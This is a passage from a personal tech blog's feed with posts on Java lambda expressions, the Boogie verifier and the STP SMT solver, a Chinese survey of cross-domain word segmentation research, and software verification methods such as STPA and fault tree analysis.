<table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public void runThread() &#123;</span><br><span class="line">    new Thread(</span><br><span class="line">         () -&gt; &#123;System.out.println(&quot;test&quot;);&#125;</span><br><span class="line">    ).start();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>方法体总只有一句代码所以可以继续简化:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public void runThread() &#123;</span><br><span class="line">    new Thread(</span><br><span class="line">         () -&gt; System.out.println(&quot;test&quot;);</span><br><span class="line">    ).start();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>下面是一些常见的lambda表达式，可以加上参数类型:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">(int a, int b) -&gt; &#123;  return a + b; &#125;</span><br><span class="line">() -&gt; System.out.println(&quot;Hello World&quot;);</span><br><span class="line">(String s) -&gt; &#123; System.out.println(s); &#125;</span><br><span class="line">() -&gt; 42</span><br><span class="line">() -&gt; &#123; return 3.1415 &#125;;</span><br><span class="line">a -&gt; return a * a; // 形式参数中只有a</span><br></pre>      </td>    </tr>  </table></figure><p>你也可以自己编写函数式接口:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">@FunctionalInterface</span><br><span class="line">public interface Annimal &#123;</span><br><span class="line">    public abstract void play();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><code>@FunctionalInterface</code>是 <code>Java 8</code> 新加入的一种接口，用于指明该接口类型声明是根据 <code>Java</code> 语言规范定义的函数式接口。<code>Java 8</code> 还声明了一些 Lambda 表达式可以使用的函数式接口，当你注释的接口不是有效的函数式接口时，可以使用 <code>@FunctionalInterface</code> 解决编译层面的错误。 另外，在 <code>Java 8</code>中接口支持方法的实现，对函数式接口并不影响:</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">@FunctionalInterface</span><br><span class="line">@RequiresApi(api = Build.VERSION_CODES.N)</span><br><span class="line">public interface Annimal &#123;</span><br><span class="line">    public abstract void play();</span><br><span class="line">    default void fly()&#123;</span><br><span class="line">      System.out.println(&quot;fly&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static void eat()&#123;</span><br><span class="line">      System.out.println(&quot;eat&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>上面的书写并不会编译报错，也是符合规范的，但是如果添加普通的方法就会报错，所以最好在接口上使用注解<code>@FunctionalInterface</code>进行声明，以免团队的其他人员错误地往接口中添加新的方法。</p><h1>Lambda表达式与匿名类的区别</h1><p>使用匿名类与 Lambda 表达式的一大区别在于关键词的使用。对于匿名类，关键词<code>this</code>解读为匿名类，而对于 Lambda 表达式，关键词<code>this</code>解读为写就 Lambda 的外部类。</p><p><code>Lambda</code> 表达式与匿名类的另一不同在于两者的编译方法。<code>Java</code> 编译器编译 <code>Lambda</code> 表达式并将他们转化为类里面的私有函数，它使用 <code>Java 7</code> 中新加的<code>invokedynamic</code>指令动态绑定该方法。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1eac83ce/">http://home.meng.uno/articles/1eac83ce/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Lambda表达式
要理解lambda表达式，首先要了解的是函数式接口（functional interface）。简单来说，函数式接口是只包含一个抽象方法的接口。比如Java标准库中的java.lang.Runnable和java.util.Comparator都是典型的函数式接口。对于函数式接口，除了可以使用Java中标准的方法来创建实现对象之外，还可以使用lambda表达式来创建实现对象。这可以在很大程度上简化代码的实现。在使用lambda表达式时，只需要提供形式参数和方法体。由于函数式接口只有一个抽象方法，所以通过lambda表达式声明的方法体就肯定是这个唯一的抽象方法的实现，而且形式
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Lambda" scheme="http://home.meng.uno/tags/Lambda/"/>
    
  </entry>
  
  <entry>
    <title>Boogie</title>
    <link href="http://home.meng.uno/articles/4f0a9591/"/>
    <id>http://home.meng.uno/articles/4f0a9591/</id>
    <published>2018-01-03T14:43:12.000Z</published>
    <updated>2020-12-02T01:41:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>Boogie is an intermediate verification language (IVL), intended as a layer on which to build program verifiers for other languages. It is also the name of the verification tool that takes Boogie programs as input. It can accept the input of a Boogie program  and generate verification conditions that are passed to an SMT solver such as Z3 used by my test.</p><h2 id="build-and-run">Build and Run</h2><p>Building this project is very simple, however, we may need to install many other tools such as “Mono” (I use a MacBook to build this project) and “NuGet”. The information of successfully building is like this.</p><p><img src="http://www.meng.uno/images/boogie/1.png" alt="Boogie"></p><p>There are two kinds of verifications said by the authors: Driver tests and Unit tests, however, I couldn’t find the python script for the latter, so I just run the driver tests.</p><h2 id="driver-tests">Driver Tests</h2><p>In this kind of tests, we need to use “lit” and “OutputCheck”. We could run all the tests by “lit .”. The result is shown as follows.</p><p><img src="http://www.meng.uno/images/boogie/2.png" alt="Boogie"></p><p>We also could run a single test by giving “lit” a specific folder or file. The picture is a test of a folder.</p><p><img src="http://www.meng.uno/images/boogie/3.png" alt="Boogie"></p><h2 id="analyze-the-test">Analyze the Test</h2><p><img src="http://www.meng.uno/images/boogie/4.png" alt="Boogie"></p><p>The picture is a function written by Boogie, from which we can see that the Boogie language is something like C language. In addition, in every Boogie file, every function is separated.</p><p>If there are some errors occurred, there will be a “.expect” file outputted like this to tell us why they are wrong.</p><p><img src="http://www.meng.uno/images/boogie/5.png" alt="Boogie"></p><h2 id="write-a-test">Write A Test</h2><p>We can write a new file or just add our function to a existed file. The following is my test:</p><p><img src="http://www.meng.uno/images/boogie/6.png" alt="Boogie"></p><p>This is the result:</p><p><img src="http://www.meng.uno/images/boogie/7.png" alt="Boogie"></p><p>I plan to analyze this project deeply, however, its code is very old so it maybe a little difficult for me to do this. I just do these tests on this projects now. Maybe I will analyze the whole project some day. From this project, I can learn what is  an intermediate verification language (IVL) and how it works. I found that there were many tools adapting this strategy, including the VCC and HAVOC verifiers for C and the verifiers for Dafny, Chalice, and Spec#.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/4f0a9591/">http://home.meng.uno/articles/4f0a9591/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Boogie is an intermediate verification language (IVL), intended as a layer on which to build program verifiers for other languages. It is also the name of the verification tool that takes Boogie programs as input. It can accept the input of a Boogie program and generate verification conditions that 
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Boogie" scheme="http://home.meng.uno/tags/Boogie/"/>
    
      <category term="Language" scheme="http://home.meng.uno/tags/Language/"/>
    
  </entry>
  
  <entry>
    <title>Simple Theorem Prover SMT solver</title>
    <link href="http://home.meng.uno/articles/cd3afb7d/"/>
    <id>http://home.meng.uno/articles/cd3afb7d/</id>
    <published>2018-01-03T13:42:58.000Z</published>
    <updated>2020-12-02T02:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>I found it could be generated as program analysis tools, theorem provers, automated bug finders and so on which means it is a very crucial research. STP is a constraint solver aimed at solving constraints of bit vectors and arrays. It can read CVC, SMT-LIB1  and SMT-LIB2 formats files. It also could be used by Python, SMT-LIBv2 and even C library. STP preprocesses the input through the application of mathematical and logical identities, and then eagerly translates constraints into a purely propositional  logic formula that it feeds to an off-the-shelf SAT solver.</p><p>STP views memory as untyped bytes. It provides only three data types: booleans, bitvectors, and arrays of bitvectors. A bitvector is an unsigned, fixed-length sequence of bits. For example, “0010” is a constant, 4-bit bitvector representing the constant  2.</p><h2 id="build-and-run">Build and Run</h2><p>We can build this project on Linux or Docker, however, you know, Google isn’t well supported in China, so I can’t use “repo” execution which needed by Docker. In this document, I will use a quick install.</p><p>Firstly, we need to install many dependencies. Then, since STP uses “minisat” as its SAT solver by default, we need to install it first. It is very simple to do this by “cmake”. The following is part of the output.</p><p><img src="http://www.meng.uno/images/stp/1.png" alt="STP"></p><p>Then we could start to install STP (To get the code, we need to use “git clone” but not download it directly).</p><p><img src="http://www.meng.uno/images/stp/2.png" alt="STP"></p><p>This project depends on various external tools to do testing. Here we install “lit” and do some individual tests and use “GoogleTest” to write some unit tests.</p><h2 id="analyze-individual-test">Analyze Individual Test</h2><p>An individual test is like this.</p><p><img src="http://www.meng.uno/images/stp/3.png" alt="STP"></p><p>In this screenshot, we can see that this file is judging “b = (c || b)” and “((c || b) = b) &lt; c &lt; b”. We could find that an individual test file may contain these components:</p><ul>  <li>“; line”: comments;</li>  <li>“set-info”: set some configuration information for running this file;</li>  <li>“declare-fun”: definite some functions and their return types;</li>  <li>“assert”: like C lang, do some judgement;</li>  <li>“exit”: return.</li></ul><h2 id="analyze-unit-test">Analyze Unit Test</h2><p>We can simply run unit test by giving “lit” the individual tests directory or run “make C-api-tests” to build the C-api tests as unit tests. The Cpp file is like this.</p><p><img src="http://www.meng.uno/images/stp/4.png" alt="STP"></p><p>From this picture, we can see that a C-api test contains many simple verifications.</p><h2 id="analyze-the-code-structure">Analyze the Code Structure</h2><p><img src="http://www.meng.uno/images/stp/5.png" alt="STP"></p><p>From the above picture, I give the following simple understandings to this project.</p><ul>  <li>“Interface”: Define a C interface to achieve the file ins and outs;</li>  <li>“Sat”: Copy from “minisat” to call SAT solver.</li>  <li>“AST”: Implement the abstract syntax tree for parsed solver inputs;</li>  <li>“Util”: Store some header files for small tasks;</li>  <li>“Printer”: Appoint some output formats;</li>  <li>“Simplifier”: Simplify algorithms for AST;</li>  <li>“Parser”: Store some parsers for the CVC, SMT-LIB1, SMT-LIB2 inputs;</li>  <li>“STPManager”: Hold all components together.</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/cd3afb7d/">http://home.meng.uno/articles/cd3afb7d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      I found it could be generated as program analysis tools, theorem provers, automated bug finders and so on which means it is a very crucial research. STP is a constraint solver aimed at solving constraints of bit vectors and arrays. It can read CVC, SMT-LIB1 and SMT-LIB2 formats files. It also could 
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="solver" scheme="http://home.meng.uno/tags/solver/"/>
    
      <category term="STP" scheme="http://home.meng.uno/tags/STP/"/>
    
      <category term="SMT" scheme="http://home.meng.uno/tags/SMT/"/>
    
  </entry>
  
  <entry>
    <title>跨领域分词国内外研究现状</title>
    <link href="http://home.meng.uno/articles/e38d3f1c/"/>
    <id>http://home.meng.uno/articles/e38d3f1c/</id>
    <published>2017-12-22T12:15:00.000Z</published>
    <updated>2020-12-02T02:10:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="国内研究">国内研究</h2><p>国内研究中文分词的科研单位主要有：中科院、清华、北大、北京语言学院、东北大学、MSRA、IBM研究院以及<strong>哈工大</strong>等。</p><p>国内主要的成熟的分词系统：ICTCLAS（汉语词法分析系统）、海量信息、盘古分词、结巴分词、BosonNLP以及**哈工大语言云（LTP-Cloud）**等。</p><p>国内在中文分词算法的研究上进展颇丰，参与的科研机构也比较多，使用的方法也比较杂乱，从[1]—[19]可以看出。国内分词算法上的进展主要有：2005年，哈工大[13]在分词阶段以基于词的n-gram方法为核心。先将词按照词典初步切分，并从训练语料统计得到3-gram信息，动态规划计算哪条切分路径最优。但在命名实体识别、新词识别、消除分词歧义部分使用ME模型。2007年，赵海等人[19]研究了基于子串标注的分词算法，在Bakeoff-2005测试集上准确度较高。2009年，[3]利用一种基于N元语法的汉语自动分词系统,  将分词与标注结合起来, 用词性标注来参与评价分词结果。[34]提出了一种字词联合解码的分词方法，算法中使用了字、词信息，充分发挥由字构词识别未登录词的能力。2010年，[35]提出基于词边界分类的分词方法，该方法对字符之间的边界进行分类，判断是否为词的边界，从而达到分词目的。[36]将基于字的生成模型与基于字的判别模型进行联合。2014年，[29]对[28]的模型做了重要改进，引入了标签向量来更精细地刻画标签之间的转移关系，其改进程度类似于引入Markov特征到最大熵模型之中。2015年，为了更完整精细地对分词上下文建模，[30]提出了一种带有自适应门结构的递归神经网络(GRNN)抽取n-gram特征，其中的两种定制的门结构（重置门、更新门）被用来控制n-gram信息的融合和抽取。2016年，[31]将GRNN和LSTM联合起来使用。该模型中，先用双向LSTM提取上下文敏感的局部信息，然后在滑动窗口内将这些局部信息用带门结构的递归神经网络融合起来，最后用作标签分类的依据。[32]提出了一种基于转移的模型用于分词，并将传统的特征模版和神经网络自动提取的特征结合起来，在神经网络自动提取的特征和传统的离散特征的融合方法做了尝试。2017年，[33]通过简化网络结构，混合字词输入以及使用早期更新（early  update）等收敛性更好的训练策略，设计了一个基于贪心搜索(greedy search)的快速分词系统。该算法与之前的深度学习算法相比不仅在速度上有了巨大提升，分词精度也得到了进一定提高。</p><p>在领域自适应方面相关研究比较少，2008年，[45]利用并发展针对单个汉字的构词能力和构词模式公式, 计算词的构词能力和词的构词模式, 并以此作为新词发现的规则, 对科技领域做了新词发现和新技术发现的实验。2012年，[41]通过将外部词典信息融入统计分词模型 (使用CRF 统计模型)来实现领域自适应性。在确定一个领域并给出这个领域的文献数据集合的前提下，[44]主要从这两个步骤进行新词发现：首先对特定领域的文献集合进行分词处理，在进行分词处理方面使用了基于统计的N-Gram方法，较为有效地找出了词典中所不存在地新词汇；第二个步骤为新的专业词汇的抽取，这是一个根据已有专业词汇来发现未知专业词汇的过程，目的从第一步中所产生的新的词汇中抽取出新的属于目标领域的专业词汇，在这个步骤中，使用了Apriori方法。2013年，[40]实现了基于生语料的领域自适应分词模型和双语引导的汉语分词，并提出融合多种分词结果的方法，通过构建格状(Lattice)结构并使用动态规划算法得到较佳汉语分词结果。2015年，[39]提出Active  Learning与n-gram统计特征相结合，通过对目标领域文本与已有标注语料差异统计分析，选择含有最多未标记过得语言现象的小规模语料优先进行人工标注的方法，此法验证在科技文献上有所提高。[43]提出使用卡方统计 量以及边界熵提升未登录词的处理能力，并结合自学习和协同学习策略进一步改善字标注分词方法在领域适应性方面的性能。2016年，[42]提出一种条件随机场与领域词典相结合的方法提高领域自适应性，并根据构词规则提出了固定词串消解，动词消解，词概率消解三种方法消除歧义。</p><h2 id="国外研究">国外研究</h2><p>国外研究中文分词的主要科研机构有：斯坦福、SUTD、UC Berkeley、CMU、CityU等。</p><p>国外成熟的分词系统有：Core NLP（斯坦福 NLP Group）、Zpar（SUTD）、Basis Technology、Open NLP (Apache 基金会)等。</p><p>国外分词算法上的进展：2003年之前，主要集中在词典与人工规则相结合，词典与概率统计规则相结合。2005年，开始使用基于字序列标注的分词方法，该方法始于[20]，第一次将严格的串标注学习应用于分词在[21]和[22]之后。[23]与[24]的出现，基于CRF模型崭露头角，在此之后，CRF多个变种构成了深度学习时代之前的标准分词模型。基于词的随机过程建模导致一个CRF变种，即semi-CRF(半条件随机场)模型的直接应用。2006年，基于字序列标注的方法已经开始盛行，核心模型仍然是ME与CRF，同年，[25]发表semi-CRF的第一个分词实现。[26]提出了一种基于子词（subword）的标注学习，基本思路是从训练集中抽取高频已知词构造子词词典。2007年，ME的方法已经开始退出舞台，CRF越来越成为主流。2010年，核心方法还是基于CRF模型，后处理是SVM-HMM模型。2011年，当子串的抽取和统计度量得分计算扩展到训练集之外，[27]实际上提出了一种扩展性很强的半监督分词方法，实验也验证了其有效性。2013年，[28]提出神经网络中文分词方法，首次验证了深度学习方法应用到中文分词任务上的可行性。</p><p>在领域自适应上，由耶鲁大学教授提出的Active Learning得到了较为广泛的使用。</p><p><strong>待补充</strong></p><h2 id="参考文献">参考文献</h2><p>[1] 马晏. 基于评价的汉语自动分词系统的研究与实现[D]. 清华大学, 1991.</p><p>[2] 张国兵, 李淼. 一种基于局部歧义词网格的快速分词算法[J]. 计算机工程与应用, 2008, 44(12):175-177.</p><p>[3] 石佳, 蔡皖东. 基于N元语法的汉语自动分词系统研究[J]. 微电子学与计算机, 2009, 26(7):98-101.</p><p>[4] 韩莹, 王茂发, 陈新房,等. 汉语自动分词词典新机制—词值哈希机制[J]. 计算机系统应用, 2013, 22(2):233-235.</p><p>[5] 蒋才智, 王浩. 基于memcached的动态四字双向词典机制[J]. 计算机应用研究, 2011, 28(1):152-154.</p><p>[6] 刘超, 王卫东. 基于双哈希词典机制中文分词的研究[J]. 信息技术, 2016, 40(11).</p><p>[7] 刘挺, 吴岩, 王开铸. 串频统计和词形匹配相结合的汉语自动分词系统[J]. 中文信息学报, 1998, 12(1):17-25.</p><p>[8] 唐涛. 面向特定领域的中文分词技术的研究[D]. 沈阳航空航天大学, 2012.</p><p>[9] 卢志茂, 刘挺, 郎君,等. 神经网络和贝叶斯网络在汉语词义消歧上的对比研究[J]. 高技术通讯, 2004, 14(8):15-19.</p><p>[10] 廖先桃, 于海滨, 秦兵,等. HMM与自动规则提取相结合的中文命名实体识别[C]// 全国学生计算语言学研讨会. 2004.</p><p>[11] 程志刚. 基于规则和条件随机场的中文命名实体识别方法研究[D]. 华中师范大学, 2015.</p><p>[12] 祝继锋. 基于SVM和HMM算法的中文机构名称识别[D]. 吉林大学, 2017.</p><p>[13] ZHUORAN WANG, TING LIU. Chinese Unknown Word Identification Based on Local Bigram Model[J]. International Journal of Computer Processing of Oriental Languages, 2012, 1(3):185-196.</p><p>[14] 原媛, 彭建华, 张汝云. 基于统计的汉语词义消歧研究[J]. 信息工程大学学报, 2007, 8(4):501-504.</p><p>[15] 肖建涛. 基于最大熵原理的汉语词义消歧与标注语言模型研究[D]. 北京机械工业学院 北京信息科技大学, 2007.</p><p>[16] 张旭. 一个基于词典与统计的中文分词算法[D]. 电子科技大学, 2007.</p><p>[17] 佟德琴. 基于字词联合解码的中文分词研究[D]. 大连理工大学, 2011.</p><p>[18] 赵海, 揭春雨, 宋彦. 基于字依存树的中文词法-句法一体化分析[C]// 中国计算机语言学研究前沿进展. 2009.</p><p>[19] 赵海, 揭春雨. 基于有效子串标注的中文分词[J]. 中文信息学报, 2007, 21(5):8-13.</p><p>[20] Nianwen Xue. Chinese Word Segmentation as Character Tagging. Computational Linguistics and Chinese Language Processing, 8(1), 2003, pp. 29–48.</p><p>[21] Hwee Tou Ng and Jin Kiat Low. Chinese part-of-speech tagging: One-at-a-time or all-at-once? word-based or character-based? In Conference on Empirical Methods in Natural Language Processing, 2004, pp. 277–284.</p><p>[22] Jin Kiat Low, Hwee Tou Ng, and Wenyuan Guo. A maximum entropy approach to Chinese word segmentation. In Proceedings of the SIGHAN Workshop on Chinese Language Processing, 2005, pp. 448–455.</p><p>[23] Huihsin Tseng, Pichuan Chang, Galen Andrew, Daniel Jurafsky, and Christopher Manning. A conditional random field word segmenter for SIGHAN bakeoff 2005. In Proceedings of the SIGHAN workshop on Chinese language Processing, vol. 171, 2005.</p><p>[24] Fuchun Peng, Fangfang Feng, and Andrew McCallum. Chinese segmentation and new word detection using conditional random fields. In Proceedings of the international conference on Computational Linguistics, 2004, pp. 562–569.</p><p>[25] Galen Andrew. A hybrid Markov/semi-Markov conditional random field for sequence segmentation. In Proceedings of the Conference on Empirical Methods in Natural Language Processing, 2006, pp. 465– 472.</p><p>[26] Ruiqiang Zhang, Genichiro Kikui, and Eiichiro Sumita. Subword-based tagging for confidence-dependent Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics and the international conference  on Computational Linguistics, 2006, pp. 961–968.</p><p>[27] Hai Zhao and Chunyu Kit. Integrating Unsupervised and Supervised Word Segmentation: the Role of Goodness Measures. Information Sciences, 181(1), 2011, pp. 163–183.</p><p>[28] Xiaoqing Zheng, Hanyang Chen, and Tianyu Xu. Deep learning for Chinese word segmentation and POS tagging. In Proceedings of the Conference on Empirical Methods in Natural Language Processing, 2013, pp.647–657.</p><p>[29] Wenzhe Pei, Tao Ge, and Baobao Chang. Max-margin tensor neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2014, pp. 293–303.</p><p>[30] Xinchi Chen, Xipeng Qiu, Chenxi Zhu, and Xuanjing Huang. Gated recursive neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics and the 7th International Joint Conference  on Natural Language Processing, 2015a, pp. 1744–1753.</p><p>[31] Jingjing Xu and Xu Sun. Dependency-based gated recursive neural network for Chinese word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics (Volume 2: Short Papers), 2016, pp. 567–572.</p><p>[32] Meishan Zhang, Yue Zhang, and Guohong Fu. Transition-based neural word segmentation. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2016, pp. 421–431.</p><p>[33] Deng Cai, Hai Zhao, Zhisong Zhang, Yuan Xin, Yongjian Wu, and Feiyue Huang. Fast and accurate neural word segmentation for Chinese. In Proceedings of the Annual Meeting of the Association for Computational Linguistics, 2017.</p><p>[34] 宋彦, 蔡东风, 张桂平,等. 一种基于字词联合解码的中文分词方法[J]. 软件学报, 2009, 20(9):2366-2375.</p><p>[35] 李寿山, 黄居仁. 基于词边界分类的中文分词方法[J]. 中文信息学报, 2010, 24(1):3-7.</p><p>[36] Wang K, Su K Y, Su K Y. A character-based joint model for Chinese word segmentation[C]// International Conference on Computational Linguistics. Association for Computational Linguistics, 2010:1173-1181.</p><p>[37] 王娟, 曹庆花, 黄精籼,等. 基于受限领域的中文分词系统[J]. 信息系统工程, 2011(11):106-106.</p><p>[38] 张少阳. 领域自适应中文分词系统的研究与实现[D]. 沈阳航空航天大学, 2017.</p><p>[39] 许华婷, 张玉洁, 杨晓晖,等. 基于Active Learning的中文分词领域自适应[J]. 中文信息学报, 2015, 29(5):55-62.</p><p>[40] 苏晨, 张玉洁, 郭振,等. 适用于特定领域机器翻译的汉语分词方法[J]. 中文信息学报, 2013, 27(5):184-190.</p><p>[41] 张梅山, 邓知龙, 车万翔,等. 统计与词典相结合的领域自适应中文分词[J]. 中文信息学报, 2012, 26(2):8-12.</p><p>[42] 朱艳辉, 刘璟, 徐叶强,等. 基于条件随机场的中文领域分词研究[J]. 计算机工程与应用, 2016, 52(15):97-100.</p><p>[43] 韩冬煦, 常宝宝. 中文分词模型的领域适应性方法[J]. 计算机学报, 2015, 38(2):272-281.</p><p>[44] 李明. 针对特定领域的中文新词发现技术研究[D]. 南京航空航天大学, 2012.</p><p>[45] 王文荣, 乔晓东, 朱礼军. 针对特定领域的新词发现和新技术发现[J]. 现代图书情报技术, 2008, 24(2):35-40.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/e38d3f1c/">http://home.meng.uno/articles/e38d3f1c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      国内研究
国内研究中文分词的科研单位主要有：中科院、清华、北大、北京语言学院、东北大学、MSRA、IBM研究院以及哈工大等。

国内主要的成熟的分词系统：ICTCLAS（汉语词法分析系统）、海量信息、盘古分词、结巴分词、BosonNLP以及**哈工大语言云（LTP-Cloud）**等。

国内在中文分词算法的研究上进展颇丰，参与的科研机构也比较多，使用的方法也比较杂乱，从[1]—[19]可以看出。国内分词算法上的进展主要有：2005年，哈工大[13]在分词阶段以基于词的n-gram方法为核心。先将词按照词典初步切分，并从训练语料统计得到3-gram信息，动态规划计算哪条切分路径最优。但在命名实
    
    </summary>
    
      <category term="Natural Language Processing" scheme="http://home.meng.uno/categories/Natural-Language-Processing/"/>
    
    
      <category term="分词" scheme="http://home.meng.uno/tags/%E5%88%86%E8%AF%8D/"/>
    
      <category term="跨领域" scheme="http://home.meng.uno/tags/%E8%B7%A8%E9%A2%86%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>Software Verification Approaches</title>
    <link href="http://home.meng.uno/articles/55e262ef/"/>
    <id>http://home.meng.uno/articles/55e262ef/</id>
    <published>2017-12-11T13:19:48.000Z</published>
    <updated>2020-12-02T02:05:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="network-function-virtualization-nfv">Network Function Virtualization (NFV)</h2><p>In the beginning, we need to know NFV which through the establishment of VNF (Virtualized Network Function) to achieve some network functions on a common server, switches, memory and other hardware devices, making these network functions on a common hardware  device run, do not need to configure a new dedicated network elements, can greatly enhance the flexibility of the network deployment, and lower investment costs.</p><p>In the process of realization of network functionality through NFV technology, VNF in the form of software running on the hardware, by way of example and to achieve termination VNF allocation and deallocation of resources.</p><p>In order to avoid VNF packet forgery in transit and in storage and tampering, increasing the signature files in the software package VNF, the receiving end after receiving the VNF software package by verifying signature files for VNF package for secure  authentication to ensure VNF packet during transmission security; in addition, the receiving end before VNF instantiated need for storage VNF package for secure authentication to ensure VNF package in the store security, which increased VNF instantiation  delay, reduce the VNF instantiated performance.</p><h2 id="systems-theoretic-process-analysis-stpa">Systems-Theoretic Process Analysis (STPA)</h2><p>STPA is for identifying harmful circumstances which could lead to accidents and generating detailed safety requirements which must be implemented in the design to prevent the occurrence of these unsafe scenarios in the system. STPA is a top-down process  and it addresses many types of hazards of components and their interactions like design errors, software flaws and component interaction failures. One of the advantages of STPA is that it can be applied at any stage of the system development process.  STPA is performed by four main steps:</p><ol>  <li>Before conducting an STPA analysis, the safety analysts should establish fundamentals of the analysis (e.g. accidents, the associated hazards) and construct the control structure diagram.</li>  <li>For each control action in the control diagram, the safety analysts must identify the potentially unsafe control actions of the system that could lead to a hazardous state. A unsafe control action is a control action that violates system safety constraints.</li>  <li>Use the identified hazardous control actions to create safety requirements and constraints.</li>  <li>Determine how each potentially hazardous control action, identified in step 2., could occur by augmenting the control structure diagram with a process model.</li></ol><h2 id="software-model-checking-smc">Software Model Checking (SMC)</h2><p>SMC is an automatic technique based on a verification model which explore all possible software states in a brute-force manner to prove properties of their execution. The model checking process involves the target software to be formally modeled in the  input language of a model checker and specifications (properties) to be formalized in a temporal logic. Many safety-critical software systems are being written in ANSI-C. Therefore, there exist a number of software model checker tools which are used  to verify code conducted a comparison and evaluation of existing model checking tools for C code. This comparison showed that the SPIN model checker, a general-purpose model checker, uses an efficient algorithm to reduce the state explosion problem.</p><h2 id="safety-analysis-combining-stpa-and-smc">Safety Analysis Combining STPA and SMC</h2><p>This method can derive software safety requirements at the system level and to verify them at the code level. This approach is divided into three kinds of activities:</p><ol>  <li>Deriving software safety requirements using STPA;</li>  <li>Formalizing of safety requirements and</li>  <li>Verifying software against its safety requirements at the code level.</li></ol><p>The structure is like this:</p><p><img src="http://www.meng.uno/images/software_verification.png" alt="Software Verification"></p><h2 id="fault-tree-analysis-fta">Fault Tree Analysis (FTA)</h2><p>FTA is a top-down, deductive failure analysis in which an undesired state of a system is analyzed using Boolean logic to combine a series of lower-level events. The propose is to understand how systems can fail, to identify the best ways to reduce risk  or to determine event rates of a safety accident or a particular system level failure.</p><p>This method can divide into 5 steps:</p><ol>  <li>Define the undesired event to study;</li>  <li>Obtain an understanding of the system;</li>  <li>Construct the fault tree;</li>  <li>Evaluate the fault tree;</li>  <li>Control the hazards identified.</li></ol><p><br><br>本文链接： <a href="http://home.meng.uno/articles/55e262ef/">http://home.meng.uno/articles/55e262ef/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Network Function Virtualization (NFV)
In the beginning, we need to know NFV which through the establishment of VNF (Virtualized Network Function) to achieve some network functions on a common server, switches, memory and other hardware devices, making these network functions on a common hardware dev
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Software Verification" scheme="http://home.meng.uno/tags/Software-Verification/"/>
    
  </entry>
  
  <entry>
    <title>浅析VR/AR+：医疗</title>
    <link href="http://home.meng.uno/articles/c1dd0093/"/>
    <id>http://home.meng.uno/articles/c1dd0093/</id>
    <published>2017-11-18T13:07:15.000Z</published>
    <updated>2020-12-02T02:10:04.000Z</updated>
    
